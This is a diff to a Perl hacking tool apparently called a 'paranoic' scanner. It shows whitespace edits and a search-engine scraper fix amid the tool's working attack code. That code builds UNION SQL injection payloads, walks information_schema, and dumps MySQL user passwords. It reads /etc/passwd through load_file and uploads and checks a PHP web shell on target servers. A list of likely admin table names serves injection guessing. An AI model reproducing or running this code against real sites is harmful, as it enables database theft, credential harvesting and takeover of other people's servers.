@@ -1,4 +1,4 @@
-﻿#!usr/bin/perl
+#!usr/bin/perl
 #################################################################################
 #This software is Copyright (c) 2014 by Doddy Hackman.
 #
@@ -110,6 +110,7 @@
 #Necessary modules
 #http://search.cpan.org/~animator/Color-Output-1.05/Output.pm
 #ppm install http://trouchelle.com/ppm/Color-Output.ppd
+#ppm install http://www.eekboek.nl/dl/ppms/Crypt-SSLeay.ppd
 #http://search.cpan.org/~exiftool/Image-ExifTool-9.27/lib/Image/ExifTool.pod
 #http://search.cpan.org/~timb/DBI-1.630/DBI.pm
 #http://search.cpan.org/~capttofu/DBD-mysql-4.025/lib/DBD/mysql.pm
@@ -148,6 +149,7 @@
 #[+] Spaces between text too annoying
 #[+] Added array to bypass
 #[+] Failed to read from file
+#[+] Fixed google & bing scanner
 #
 #[++] New options
 #
@@ -178,6 +180,7 @@ use LWP::UserAgent;
 use URI::Escape;
 use IO::Socket;
 use URI::Split qw(uri_split);
+use URI::Escape;
 use File::Basename;
 use HTML::Form;
 use HTML::Parser;
@@ -864,7 +867,7 @@ my @buscar2 = (
     'admins',                        'adminuser',
     'art',                           'article_admin',
     'articles',                      'artikel',
-    'ÃÜÂë',                      'aut',
+    'ÃÜÂë',                          'aut',
     'autore',                        'backend',
     'backend_users',                 'backenduser',
     'bbs',                           'book',
@@ -913,7 +916,7 @@ my @buscar2 = (
     'newsletter',                    'nuke_authors',
     'nuke_bbconfig',                 'nuke_config',
     'nuke_popsettings',              'nuke_users',
-    'ÓÃ»§',                      'obb_profiles',
+    'ÓÃ»§',                          'obb_profiles',
     'order',                         'orders',
     'parol',                         'partner',
     'partners',                      'passes',
@@ -1837,7 +1840,7 @@ sub genlogs {
                 if ( -d $dircon and $archivo ne "." and $archivo ne ".." ) {
 
                     savefil( "logs_html/exploitdb.html",
-                            "<table border=1><td><b><center>" 
+                            "<table border=1><td><b><center>"
                           . $archivo
                           . "</center></b></td><tr>" );
 
@@ -2407,7 +2410,7 @@ sub portscanner {
               )
             {
                 printear(
-                    "[Port] : " 
+                    "[Port] : "
                       . $port
                       . " [Service] : "
                       . $ports{$port} . "\n",
@@ -3530,9 +3533,9 @@ sub load_kobra {
               . ascii( "RATSXPDOWN" . $rows . "RATSXPDOWN" ) . ")";
             $total .= "," . $rows;
             $injection =
-                $page . "1" 
-              . $pass1 . "and" 
-              . $pass1 . "1=0" 
+                $page . "1"
+              . $pass1 . "and"
+              . $pass1 . "1=0"
               . $pass1 . "union"
               . $pass1
               . "select"
@@ -3541,7 +3544,7 @@ sub load_kobra {
               . $asc;
             $test = toma($injection);
             if ( $test =~ /RATSXPDOWN/ ) {
-                @number = $test =~ m{RATSXPDOWN(\d+)RATSXPDOWN}g;
+                @number  = $test =~ m{RATSXPDOWN(\d+)RATSXPDOWN}g;
                 $control = 1;
 
                 my $save = partimealmedio( $_[0] );
@@ -3555,9 +3558,9 @@ sub load_kobra {
                 $total =~ s/$number[0]/hackman/;
                 savefilear(
                     $save . ".txt",
-                    "[SQLI] : " 
-                      . $page . "1" 
-                      . $pass1 . "and" 
+                    "[SQLI] : "
+                      . $page . "1"
+                      . $pass1 . "and"
                       . $pass1 . "1=0"
                       . $pass1 . "union"
                       . $pass1
@@ -3566,9 +3569,9 @@ sub load_kobra {
                       . $total
                 );
                 return (
-                    $page . "1" 
-                      . $pass1 . "and" 
-                      . $pass1 . "1=0" 
+                    $page . "1"
+                      . $pass1 . "and"
+                      . $pass1 . "1=0"
                       . $pass1 . "union"
                       . $pass1
                       . "select"
@@ -3634,7 +3637,7 @@ sub load_kobra {
                 printear( "[load_file] : ON\n", "text", "7", "5" );
                 savefilear(
                     $save . ".txt",
-                    "[load_file] : " 
+                    "[load_file] : "
                       . $start
                       . "unhex(hex(concat(char(69,82,84,79,82,56,53,52),load_file(0x2f6574632f706173737764))))"
                       . $end
@@ -3797,8 +3800,8 @@ s/hackman/unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),table_name,cha
         $page1 =~
 s/hackman/unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),Count(*),char(82,65,84,83,88,80,68,79,87,78,49))))/;
         $code =
-          toma( $page1 
-              . $pass1 . "from" 
+          toma( $page1
+              . $pass1 . "from"
               . $pass1
               . "information_schema.tables"
               . $pass2 );
@@ -3812,8 +3815,8 @@ s/hackman/unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),Count(*),char(
             my $limit = $1;
             for my $limit ( 17 .. $limit ) {
                 $code1 =
-                  toma( $page 
-                      . $pass1 . "from" 
+                  toma( $page
+                      . $pass1 . "from"
                       . $pass1
                       . "information_schema.tables"
                       . $pass1 . "limit"
@@ -3858,8 +3861,8 @@ s/hackman/unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),Count(*),char(
         $page3 =~
 s/hackman/unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),Count(*),char(82,65,84,83,88,80,68,79,87,78,49))))/;
         $code3 =
-          toma( $page3 
-              . $pass1 . "from" 
+          toma( $page3
+              . $pass1 . "from"
               . $pass1
               . "information_schema.columns"
               . $pass1 . "where"
@@ -3878,8 +3881,8 @@ s/hackman/unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),column_name,ch
             $real = "1";
             for my $limit2 ( 0 .. $si ) {
                 $code4 =
-                  toma( $page4 
-                      . $pass1 . "from" 
+                  toma( $page4
+                      . $pass1 . "from"
                       . $pass1
                       . "information_schema.columns"
                       . $pass1 . "where"
@@ -3921,8 +3924,8 @@ s/hackman/unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),schema_name,ch
             $real = "1";
             for my $limit ( 0 .. $limita ) {
                 $code =
-                  toma( $page1 
-                      . $pass1 . "from" 
+                  toma( $page1
+                      . $pass1 . "from"
                       . $pass1
                       . "information_schema.schemata"
                       . $pass1 . "limit"
@@ -3964,8 +3967,8 @@ s/hackman/unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),table_name,cha
         $page1 =~
 s/hackman/unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),Count(*),char(82,65,84,83,88,80,68,79,87,78,49))))/;
         $code =
-          toma( $page1 
-              . $pass1 . "from" 
+          toma( $page1
+              . $pass1 . "from"
               . $pass1
               . "information_schema.tables"
               . $pass1 . "where"
@@ -3982,8 +3985,8 @@ s/hackman/unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),Count(*),char(
             $real = "1";
             for my $lim ( 0 .. $limit ) {
                 $code1 =
-                  toma( $page 
-                      . $pass1 . "from" 
+                  toma( $page
+                      . $pass1 . "from"
                       . $pass1
                       . "information_schema.tables"
                       . $pass1 . "where"
@@ -4025,8 +4028,8 @@ s/hackman/unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),Count(*),char(
         $page3 =~
 s/hackman/unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),Count(*),char(82,65,84,83,88,80,68,79,87,78,49))))/;
         $code3 =
-          toma( $page3 
-              . $pass1 . "from" 
+          toma( $page3
+              . $pass1 . "from"
               . $pass1
               . "information_schema.columns"
               . $pass1 . "where"
@@ -4049,8 +4052,8 @@ s/hackman/unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),column_name,ch
             $real = "1";
             for my $limit2 ( 0 .. $si ) {
                 $code4 =
-                  toma( $page4 
-                      . $pass1 . "from" 
+                  toma( $page4
+                      . $pass1 . "from"
                       . $pass1
                       . "information_schema.columns"
                       . $pass1 . "where"
@@ -4100,8 +4103,8 @@ s/hackman/unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),Count(*),char(
                     $cop =~
 s/hackman/unhex(hex(concat(0x524154535850444f574e,Host,0x524154535850444f574e,User,0x524154535850444f574e,Password,0x524154535850444f574e)))/;
                     $code =
-                      toma( $cop 
-                          . $pass1 . "from" 
+                      toma( $cop
+                          . $pass1 . "from"
                           . $pass1
                           . "mysql.user"
                           . $pass1 . "limit"
@@ -4142,11 +4145,11 @@ s/hackman/unhex(hex(concat(0x524154535850444f574e,Host,0x524154535850444f574e,Us
                 chomp $table;
                 $concat = "unhex(hex(concat(char(69,82,84,79,82,56,53,52))))";
                 $injection =
-                    $start 
-                  . $concat 
-                  . $end 
-                  . $pass1 . "from" 
-                  . $pass1 
+                    $start
+                  . $concat
+                  . $end
+                  . $pass1 . "from"
+                  . $pass1
                   . $table
                   . $pass2;
                 $code = toma($injection);
@@ -4184,10 +4187,10 @@ s/hackman/unhex(hex(concat(0x524154535850444f574e,Host,0x524154535850444f574e,Us
                 $concat =
 "unhex(hex(concat(char(69,82,84,79,82,56,53,52),$columns,char(69,82,84,79,82,56,53,52))))";
                 $code =
-                  toma( $start 
-                      . $concat 
-                      . $end 
-                      . $pass1 . "from" 
+                  toma( $start
+                      . $concat
+                      . $end
+                      . $pass1 . "from"
                       . $pass1
                       . $_[2]
                       . $pass2 );
@@ -4274,10 +4277,10 @@ s/hackman/unhex(hex(concat(0x524154535850444f574e,Host,0x524154535850444f574e,Us
             $concatx =
 "unhex(hex(concat(char(69,82,84,79,82,56,53,52),count($_[1]),char(69,82,84,79,82,56,53,52))))";
             $val_code =
-              toma( $start 
-                  . $concatx 
-                  . $end 
-                  . $pass1 . "from" 
+              toma( $start
+                  . $concatx
+                  . $end
+                  . $pass1 . "from"
                   . $pass1
                   . $_[3]
                   . $pass2 );
@@ -4297,10 +4300,10 @@ s/hackman/unhex(hex(concat(0x524154535850444f574e,Host,0x524154535850444f574e,Us
                 for my $limit ( 0 .. $tota ) {
                     chomp $limit;
                     $injection =
-                      toma( $start 
-                          . $concat 
-                          . $end 
-                          . $pass1 . "from" 
+                      toma( $start
+                          . $concat
+                          . $end
+                          . $pass1 . "from"
                           . $pass1
                           . $_[3]
                           . $pass1 . "limit"
@@ -4340,7 +4343,7 @@ s/hackman/unhex(hex(concat(0x524154535850444f574e,Host,0x524154535850444f574e,Us
             my $path1 = $1;
             my $path2 = $path1;
             $path2 =~ s/$1//;
-            $dir   =~ s/$path1//ig;
+            $dir =~ s/$path1//ig;
             $shell = $dir . "/" . "shell.php";
             if ( $page =~ /(.*)hackman(.*)/ig ) {
                 my ( $start, $end ) = ( $1, $2 );
@@ -4358,16 +4361,16 @@ s/hackman/unhex(hex(concat(0x524154535850444f574e,Host,0x524154535850444f574e,Us
                   toma( "http://" . $auth . "/" . $path2 . "/" . "shell.php" );
                 if ( $code1 =~ /Mini Shell By Doddy/ig ) {
                     printear(
-                        "[Shell Up] : http://" 
-                          . $auth . "/" 
+                        "[Shell Up] : http://"
+                          . $auth . "/"
                           . $path2 . "/"
                           . "shell.php" . "\a\a",
                         "text", "7", "5"
                     );
                     savefilear(
                         $save . ".txt",
-                        "[shell up] : http://" 
-                          . $auth . "/" 
+                        "[shell up] : http://"
+                          . $auth . "/"
                           . $path2 . "/"
                           . "shell.php"
                     );
@@ -4557,10 +4560,10 @@ sub load_paranoic_old {
         my ( $pass1, $pass2 ) = ( "+", "--" );
         my $page = shift;
         $code1 =
-          toma( $page . "-1" 
-              . $pass1 . "union" 
-              . $pass1 
-              . "select" 
+          toma( $page . "-1"
+              . $pass1 . "union"
+              . $pass1
+              . "select"
               . $pass1 . "666"
               . $pass2 );
         if ( $code1 =~
@@ -4584,10 +4587,10 @@ sub load_paranoic_old {
         }
 
         $code1 =
-          toma( $page . "-1" 
-              . $pass1 . "union" 
-              . $pass1 
-              . "select" 
+          toma( $page . "-1"
+              . $pass1 . "union"
+              . $pass1
+              . "select"
               . $pass1 . "666"
               . $pass2 );
         if ( $code1 =~
@@ -5052,6 +5055,10 @@ sub load_paranoic_old {
             while ( $code =~ /<h3><a href="(.*?)"/mig ) {
                 push( @founds, $1 );
             }
+
+            while ( $code =~ /<h2><a href="(.*?)"/mig ) {
+                push( @founds, $1 );
+            }
         }
         my @founds = repes( cortar(@founds) );
         return @founds;
@@ -5062,14 +5069,13 @@ sub load_paranoic_old {
         my @founds;
         for ( $pages = 10 ; $pages <= $b ; $pages = $pages + 10 ) {
             $code =
-              toma( "http://www.google.com.ar/search?hl=&q=" 
+              toma( "https://www.google.com.ar/search?hl=&q="
                   . $a
                   . "&start=$pages" );
             while ( $code =~ /(?<="r"><. href=")(.+?)"/mig ) {
                 my $url = $1;
-                if ( $url =~ /\/url\?q\=(.*?)\&amp\;/ ) {
-                    push( @founds, uri_unescape($1) );
-                }
+                push( @founds, uri_unescape($url) );
+
             }
         }
         my @founds = repes( cortar(@founds) );
